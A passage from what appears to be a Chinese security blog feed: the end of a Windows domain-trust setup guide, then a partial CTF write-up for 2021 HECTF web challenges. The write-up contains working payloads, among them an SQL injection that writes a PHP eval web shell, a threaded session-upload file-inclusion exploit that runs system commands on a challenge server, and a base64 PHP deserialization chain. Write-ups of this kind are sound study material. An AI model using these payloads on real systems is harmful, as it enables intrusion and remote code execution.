<p>2.6、在传出信任身份验证级别窗口选择 “全域身份验证”（一般情况下，我们都会选择 “全局性身份验证”；但如果有不同的需求可以选择下面一个 “选择性身份验证”，每个选项都有相关说明，这里我就不说了。），然后选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211201220236.png" alt="image-20211211201220236" /></p>
<p>2.7、建立信任密码为： <code>21r000@555</code> , 下一步；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211201254324.png" alt="image-20211211201254324" /></p>
<p>2.8、在 “选择信任完毕” 窗口选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211201606430.png" alt="image-20211211201606430" /></p>
<p>2.9、在 “信任创建完毕” 窗口，选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211201619783.png" alt="image-20211211201619783" /></p>
<p>2.10、在 “确认传出信任” 窗口，选择 “是，确认传出信任” 并选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211201638942.png" alt="image-20211211201638942" /></p>
<p>2.11、在 “确认传入信任” 窗口，选择 “是，确认传入信任” 并选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211201803081.png" alt="image-20211211201803081" /></p>
<p>2.12、在 “正在完成新建信任向导” 窗口，选择 “完成”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211201838493.png" alt="image-20211211201838493" /></p>
<p>2.13、在弹出 “ <code>Active Directory</code>  域服务” 选择 “确定”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211201854085.png" alt="image-20211211201854085" /></p>
<p>此时，在信任属性窗口中，可以看到，相关域之间的属性；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211201917383.png" alt="image-20211211201917383" /></p>
<p>到另一个域中打开域信任属性窗口，同样也可以看到两个域之间的信任。</p>
<p>至此，域信任关系建立完毕！！！</p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>yep，卡了好久，果然不是按大佬博文的操作来进行就能完全成功的，还得靠自己，自己动手丰衣足食嘛！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211202159125.png" alt="image-20211211202159125" /></p>
<h3 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS95dXBlaXpoaS8xNjk5MDk5">Windows Server 笔记（六）：Active Directory 域服务：域信任</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>2021HECTF—河北师范大学信息安全挑战赛部分WP</title>
    <url>/article/84f3998a.html</url>
    <content><![CDATA[<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222015056-373531408.png" alt="image" /></p>
<h2 id="web"><a class="anchor" href="#web">#</a> WEB</h2>
<h3 id="mmmmd5d5d5d5"><a class="anchor" href="#mmmmd5d5d5d5">#</a> mmmmd5d5d5d5</h3>
<p>链接打开页面</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222308511-2087116568.png" alt="image" /></p>
<p>绕过</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">?</span>a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222356578-2020512568.png" alt="image" /></p>
<p>构造 md5</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">for</span><span class="token punctuation">(</span>$i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> $i <span class="token operator">&lt;=</span> <span class="token number">100000</span> <span class="token punctuation">;</span> $i <span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span>$i<span class="token punctuation">)</span> <span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"3ddc6"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  echo $i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">?</span><span class="token operator">></span></pre></td></tr></table></figure><p>进入到下一层</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222417158-677545439.png" alt="image" /></p>
<p>提交</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>ffifdyop</pre></td></tr></table></figure><p>得到：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>include <span class="token string">"flag.php"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token char">'param1'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token operator">=</span>$_POST<span class="token punctuation">[</span><span class="token char">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token char">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token char">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    echo $flag<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222445656-1216210145.png" alt="image" /></p>
<p>构造 payload：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></pre></td></tr></table></figure><p>即可得到 flag</p>
<h3 id="edgnb签到"><a class="anchor" href="#edgnb签到">#</a> EDGnb (签到)</h3>
<p>直接 docker 桌面版打开</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222527544-1785668409.png" alt="image" /></p>
<p>即可得到 flag</p>
<h3 id="时光塔的宝藏"><a class="anchor" href="#时光塔的宝藏">#</a> 时光塔的宝藏</h3>
<p>链接打开一个 login 框</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/20211218192945.png" alt="20211218192945" /></p>
<p>构造 payload：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>pswd<span class="token operator">=</span>admin<span class="token operator">&amp;</span>usname<span class="token operator">=</span>admin<span class="token string">' union select 1,"&lt;?php eval($_POST[1]);?>" into outfile '</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1203</span><span class="token punctuation">.</span>php'<span class="token punctuation">;</span>#</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222615764-767952291.png" alt="image" /></p>
<p>蚁剑连 1203.php，密码为 1，即可得到 flag</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222628696-1030248584.png" alt="image" /></p>
<h3 id="lfi_to_rce"><a class="anchor" href="#lfi_to_rce">#</a> LFI_to_RCE</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">'./index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    include $_GET<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">?</span><span class="token operator">></span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> <span class="token function">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Filename cannot be empty <span class="token keyword">in</span> <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php on line <span class="token number">3</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> <span class="token function">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Failed opening <span class="token string">''</span> <span class="token keyword">for</span> <span class="token function">inclusion</span> <span class="token punctuation">(</span>include_path<span class="token operator">=</span><span class="token string">'.:/usr/local/lib/php'</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php on line <span class="token number">3</span></pre></td></tr></table></figure><p>贴上 exp：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> io</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> threading</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://81.70.102.209:10040/index.php"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>sessid <span class="token operator">=</span> <span class="token string">"21r000"</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>def <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    filebytes <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">BytesIO</span><span class="token punctuation">(</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span> <span class="token literal-property property">True</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        res <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                <span class="token string-property property">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token operator">:</span> <span class="token string">"&lt;?php eval($_POST[1]);?>"</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>                <span class="token string-property property">'PHPSESSID'</span><span class="token operator">:</span> sessid</pre></td></tr><tr><td data-num="17"></td><td><pre>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                <span class="token string-property property">'file'</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token string">'21r000.jpg'</span><span class="token punctuation">,</span> filebytes<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>def <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">while</span> <span class="token literal-property property">True</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        res <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"?file=/tmp/sess_"</span><span class="token operator">+</span>sessid<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                           data<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                               <span class="token string-property property">"1"</span><span class="token operator">:</span><span class="token string">"system('ls /');"</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                           <span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                           cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                               <span class="token string-property property">"PHPSESSID"</span><span class="token operator">:</span>sessid</pre></td></tr><tr><td data-num="31"></td><td><pre>                           <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                           <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"etc"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token operator">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token function">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    </pre></td></tr><tr><td data-num="36"></td><td><pre>    </pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">"main"</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        evnet <span class="token operator">=</span> threading<span class="token punctuation">.</span><span class="token function">Event</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">with</span> requests<span class="token punctuation">.</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token literal-property property">session</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>                threading<span class="token punctuation">.</span><span class="token function">Thread</span><span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>                threading<span class="token punctuation">.</span><span class="token function">Thread</span><span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        evnet<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222703698-1152852302.png" alt="image" /></p>
<p>访问即可得到 flag</p>
<h3 id="unserialize"><a class="anchor" href="#unserialize">#</a> unserialize</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>include <span class="token string">'hint.php'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">x</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> $value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> $cc<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">'fighting!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">public</span> $nice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>value <span class="token operator">=</span> $fake<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>value <span class="token operator">===</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>cc<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>test<span class="token operator">-</span><span class="token operator">></span><span class="token function">good</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">public</span> $value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">public</span> $array<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">good</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>array<span class="token punctuation">)</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            echo <span class="token string">'must_array'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">public</span> $value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token parameter">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span>$func<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">'y0u_A2e_HacKK!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            <span class="token function">$func</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    $pop <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token function">unserialize</span><span class="token punctuation">(</span>$pop<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>pop 链问题把 a：2 改成 a：3</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">?</span>pop<span class="token operator">=</span>TzoxOiJhIjozOntzOjQ6Im5pY2UiO3M6Mzc6Ik86MToieCI6Mjp7czo1OiJ2YWx1ZSI7TjtzOjI6ImNjIjtOO30iO3M6NDoidGVzdCI7TzoxOiJiIjoyOntzOjU6InZhbHVlIjtzOjc6IlxzeXN0ZW0iO3M6NToiYXJyYXkiO2E6Mjp7aTowO086MToiYyI6MTp7czo1OiJ2YWx1ZSI7czo5OiJjYXQgL2ZsYWciO31pOjE7czo1OiJzaGVsbCI7fX19</pre></td></tr></table></figure><p>贴上 poc</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">x</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> $value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> $cc<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>		$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>value <span class="token operator">=</span> $fake<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>cc <span class="token operator">=</span> $fake<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">'fighting!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">public</span> $nice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span 